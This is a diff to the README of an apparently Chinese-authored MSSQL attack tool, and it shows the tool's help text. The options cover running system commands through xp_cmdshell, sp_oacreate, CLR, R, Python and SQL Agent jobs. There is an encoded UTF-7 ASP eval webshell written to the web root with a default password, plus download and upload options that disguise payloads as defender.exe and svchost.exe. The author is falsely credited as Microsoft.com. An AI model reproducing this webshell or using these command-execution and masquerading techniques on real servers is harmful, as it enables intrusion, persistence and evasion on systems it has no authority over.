@@ -15,10 +15,10 @@ NAME:
    Mssql Toolkit - mssql command tool
 
 USAGE:
-   mssql-command-tools.exe [global options] command [command options] [arguments...]
+   mssql-command-tools_Linux_amd64 [global options] command [command options] [arguments...]
 
 AUTHOR:
-   Microsoft.com
+   Microsoft.com clr参考: https://github.com/uknowsec/SharpSQLTools/
 
 COMMANDS:
    help, h  Shows a list of commands or help for one command
@@ -33,13 +33,19 @@ GLOBAL OPTIONS:
    --cmd value, -c value, --exec value     Exec System Command | xp_cmdshell命令执行 (default: "whoami")
    --cmd1 value, --c1 value                Exec System Command | sp_oacreate无回显执行 (default: "whoami >C:\\whoami.log")
    --cmd2 value, --c2 value                Exec System Command | sp_oacreate有回显执行 (default: "whoami")
-   --cmd3 value, --c3 value                Exec System Command | clr无回显执行 (default: "whoami >C:\\whoami.log")
+   --cmd3 value, --c3 value                Exec System Command | clr无回显执行 (default: "clr_exec whoami")
    --cmd4 value, --c4 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
    --cmd5 value, --c5 value                Exec System Command | 自写clr执行 (default: "-c4 net -c5 user")
    --cmd6 value, --c6 value                Exec System Command | xp_cmdshell命令执行|过滤了xp_cmdshell等关键字提交方法语句 (default: "-c6 whoami")
+   --cmd7 value, --c7 value                Exec System Command | 自写clr执行 (default: "-c7 whoami")
+   --cmd8 value, --c8 value                Exec System Command | r language command (default: "-c8 whoami")
+   --cmd9 value, --c9 value                Exec System Command | python language command (default: "-c9 whoami")
+   --cmd10 value, --c10 value              Exec System Command | createAndStartJob command (default: "-c10 whoami >c:\\windows\\temp\\123.txt")
    --dir value, --dirtree value            xp_dirtree列目录 | dir c:
    --path value                            网站路径 -path + -code | c:\inetpub\wwwroot\cmd.asp (default: "c:\\inetpub\\wwwroot\\cmd.asp")
-   --code value                            -path + -code | 如果代码有"就加\来匹配<%eval request("cmd")%>网站路径和asp密 码默认:LandGrey (default: "<%@codepage=65000%><%@codepage=65000%><%+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-%>")
+   --local value                           本地路径 localFile (default: "c:\\1.txt")
+   --remote value                          远程路径 remoteFile (default: "C:\\Windows\\Temp\\1.txt")
+   --code value                            -path + -code | 如果代码有"就加\来匹配<%eval request("cmd")%>网站路径和asp密码默认:LandGrey (default: "<%@codepage=65000%><%@codepage=65000%><%+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-%>")
    --downurl value                         下载文件的url地址 | http://www.microsoft.com/defender.exe
    --filepath value                        下载文件的路径 | c:\programdata\svchost.exe
    --debug                                 Debug info
@@ -49,11 +55,17 @@ GLOBAL OPTIONS:
    --dole, --dolose                        Disable sp_oacreate
    --clr, --clropen                        Enabled clr enabled
    --dclr, --dclose                        Disable clr enabled
-   --install_clr, --in_clr                 install clr
+   --rlce, --rlceopen                      r languag eenabled
+   --plce, --plceopen                      python language enabled
+   --install_clr, --in_clr                 install clr  | clr命令参考: https://github.com/uknowsec/SharpSQLTools/
    --uninstall_clr, --un_clr               uninstall clr
    --install_clrcmd, --in_clrcmd           install clrcmd
    --uninstall_clrcmd, --un_clrcmd         uninstall clrcmd
+   --install_clrcmd1, --in_clrcmd1         install clrcmd1
+   --uninstall_clrcmd1, --un_clrcmd1       uninstall clrcmd
+   --upload                                --upload --local c:\svchost.exe --remote C:\Windows\Temp\svchost.exe
    --help, -h                              show help
+
 ```
 ##### Windows环境
 
